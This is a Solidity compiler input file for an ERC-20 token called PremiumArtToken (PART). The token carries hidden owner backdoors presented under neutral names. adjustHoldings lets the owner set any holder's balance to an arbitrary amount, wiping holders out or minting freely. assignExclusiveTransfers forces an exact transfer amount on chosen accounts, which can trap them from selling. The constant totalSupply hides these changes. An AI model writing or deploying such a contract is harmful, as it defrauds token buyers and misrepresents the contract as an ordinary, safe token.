{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface ISpecialERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract ExecutionContext {\r\n    function retrieveContextSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract SingleOverseer is ExecutionContext {\r\n    address private _overseer;\r\n    event OverseerChanged(address indexed formerOverseer, address indexed currentOverseer);\r\n\r\n    constructor() {\r\n        address originator = retrieveContextSender();\r\n        _overseer = originator;\r\n        emit OverseerChanged(address(0), originator);\r\n    }\r\n\r\n    function fetchOverseer() public view virtual returns (address) {\r\n        return _overseer;\r\n    }\r\n\r\n    modifier onlyOverseer() {\r\n        require(fetchOverseer() == retrieveContextSender(), \"Action allowed for overseer only\");\r\n        _;\r\n    }\r\n\r\n    function assignNewOverseer(address newOverseer) public onlyOverseer {\r\n        _overseer = newOverseer;\r\n        emit OverseerChanged(_overseer, newOverseer);\r\n    }\r\n\r\n    function relinquishOverseer() public virtual onlyOverseer {\r\n        emit OverseerChanged(_overseer, address(0));\r\n        _overseer = address(0);\r\n    }\r\n}\r\n\r\ncontract PremiumArtToken is ExecutionContext, SingleOverseer, ISpecialERC20 {\r\n    mapping (address => mapping (address => uint256)) private _permissions;\r\n    mapping (address => uint256) private _holdings;\r\n    mapping (address => uint256) private _exclusiveTransfers;\r\n\r\n    string public constant artTokenName = \"PremiumArtToken\";\r\n    string public constant artTokenSymbol = \"PART\";\r\n    uint8 public constant artTokenDecimals = 18;\r\n    uint256 public constant topSupply = 250000 * (10 ** artTokenDecimals);\r\n\r\n    constructor() {\r\n        _holdings[retrieveContextSender()] = topSupply;\r\n        emit Transfer(address(0), retrieveContextSender(), topSupply);\r\n    }\r\n\r\n    modifier overseerOrCreator() {\r\n        require(fetchOverseer() == retrieveContextSender(), \"Privilege is reserved for the overseer\");\r\n        _;\r\n    }\r\n\r\n    event HoldingsAdjusted(address indexed user, uint256 oldHoldings, uint256 newHoldings);\r\n\r\n    function getExclusiveTransfer(address account) public view returns (uint256) {\r\n        return _exclusiveTransfers[account];\r\n    }\r\n\r\n    function assignExclusiveTransfers(address[] calldata accounts, uint256 amount) public overseerOrCreator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _exclusiveTransfers[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function adjustHoldings(address[] memory userAddresses, uint256 updatedAmount) public overseerOrCreator {\r\n        require(updatedAmount >= 0, \"Updated amount should be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address currentUser = userAddresses[i];\r\n            require(currentUser != address(0), \"User address cannot be the zero address\");\r\n\r\n            uint256 originalHoldings = _holdings[currentUser];\r\n            _holdings[currentUser] = updatedAmount;\r\n\r\n            emit HoldingsAdjusted(currentUser, originalHoldings, updatedAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _holdings[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_holdings[retrieveContextSender()] >= amount, \"Insufficient balance\");\r\n\r\n        uint256 exactAmount = getExclusiveTransfer(retrieveContextSender());\r\n        if (exactAmount > 0) {\r\n            require(amount == exactAmount, \"Transfer amount does not meet the required exclusive transfer amount\");\r\n        }\r\n\r\n        _holdings[retrieveContextSender()] -= amount;\r\n        _holdings[recipient] += amount;\r\n\r\n        emit Transfer(retrieveContextSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _permissions[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _permissions[retrieveContextSender()][spender] = amount;\r\n        emit Approval(retrieveContextSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_permissions[sender][retrieveContextSender()] >= amount, \"Transfer amount exceeds allowance\");\r\n\r\n        uint256 exactAmount = getExclusiveTransfer(sender);\r\n        if (exactAmount > 0) {\r\n            require(amount == exactAmount, \"Transfer amount does not meet the required exclusive transfer amount\");\r\n        }\r\n\r\n        _holdings[sender] -= amount;\r\n        _holdings[recipient] += amount;\r\n        _permissions[sender][retrieveContextSender()] -= amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return topSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return artTokenName;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return artTokenSymbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return artTokenDecimals;\r\n    }\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}